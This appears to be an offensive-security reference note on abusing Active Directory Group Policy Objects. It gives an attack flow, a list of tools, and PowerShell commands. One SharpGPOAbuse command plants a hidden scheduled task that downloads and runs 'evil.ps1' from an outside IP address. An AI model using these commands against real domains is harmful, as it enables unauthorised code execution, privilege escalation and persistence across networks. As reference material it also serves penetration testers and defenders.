---
title: Active Directory – Group Policy Objects
type: technique
tags: [active-directory, gpo, persistence, privilege-escalation, reference-import, windows]
phase: post-exploitation
date_created: 2026-05-13
date_updated: 2026-07-02
sources: [InternalAllTheThings]
---

# Active Directory – Group Policy Objects

## What it is

Group Policy Objects (GPOs) control security settings, scripts, and preferences across an AD domain. Attackers who gain **Edit** rights on a GPO can inject malicious scripts, scheduled tasks, or modify security settings to achieve persistence, privilege escalation, or lateral movement.

## How it works

Attackers who gain `GenericWrite`, `WriteDacl`, or `WriteOwner` rights over a GPO can edit the policy files stored in SYSVOL to inject scheduled tasks, logon scripts, or registry modifications that execute on every machine or user in the linked OU. Because group policy is refreshed automatically every 90 minutes on domain members, a malicious payload propagates without any additional attacker interaction. This technique is used for lateral movement, privilege escalation to local admin on targeted machines, and domain-wide persistence.

## Attack phases

- **Exploitation**: primary phase for this note (credential and control-plane abuse)
- **Adjacent phases**: overlaps are common once credentials or lateral paths appear

## Prerequisites

Authorized scope covering the depicted systems; valid credentials or network reach as required by each command block inside the methodology body.

## Methodology

The following imported sections retain upstream ordering, tables, and copy-pasta blocks from InternalAllTheThings.

## Overview
Group Policy Objects (GPOs) control security settings, scripts, and preferences across an AD domain. Attackers who gain **Edit** rights on a GPO can inject malicious scripts, scheduled tasks, or modify security settings to achieve persistence, privilege escalation, or lateral movement.

## Attack Flow
1. **Identify writable GPOs** – query ACLs for `GenericWrite`, `WriteDacl`, `WriteOwner`, `GenericAll`.
2. **Dump GPO contents** – locate the GPO files in `\\<DC>\\SYSVOL\\<domain>\\Policies\\<GPO‑GUID>` (folders `User` and `Machine`).
3. **Inject malicious payload** – place a script in `Machine\\Preferences\\ScheduledTasks` or modify `User\\Scripts\\Logon`.
4. **Force policy refresh** – `gpupdate /force` or wait for the normal 90‑minute refresh window.

## Tools
- **PowerView** – `Get-DomainObjectAcl -Identity <GPO> -ResolveGUIDs` to enumerate permissions.
- **SharpGPOAbuse** – .NET tool to add immediate tasks, scripts, or local admin rights via GPO edit.
- **GPOHound** – Enumerate vulnerable GPOs and export data for analysis.
- **GroupPolicyBackdoor / pyGPOAbuse** – Python/PowerShell implementations for GPO abuse.

## Example Commands
```powershell
# Find GPOs where you have write permissions
Get-DomainObjectAcl -Identity "SuperSecureGPO" -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match "GenericWrite|WriteDacl|WriteOwner|GenericAll" }

# Add an immediate scheduled task using SharpGPOAbuse
SharpGPOAbuse.exe --AddComputerTask --GPOName "VulnerableGPO" \
  --TaskName "EvilTask" --Command "cmd.exe" --Arguments "/c powershell -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://10.0.0.5/evil.ps1'))"
```

## Persistence
- **Computer Startup Scripts** – Drop a PowerShell or batch script that runs with SYSTEM privileges.
- **Scheduled Tasks** – Immediate tasks execute on the next policy refresh, providing a stealthy foothold.

## References
- *InternalAllTheThings – Active Directory – Group Policy Objects*.
- *SharpGPOAbuse – FSecureLabs*.
- *GPOHound – Cogiceo*.
- *GroupPolicyBackdoor – synacktiv*.

## Bypasses and variants

Enumerate case-specific bypasses inside the methodologies above when upstream documented alternate paths.

## Detection and defence

Apply vendor baselines for logging, least privilege, patch cadence, and segmentation. Map signals to SOC playbooks relevant to each platform referenced in this page.

## Tools

- Also uses (no dedicated page yet): PowerView

## Sources

- Swisskyrepo [InternalAllTheThings](https://github.com/swisskyrepo/InternalAllTheThings) (ingest slug `InternalAllTheThings`).
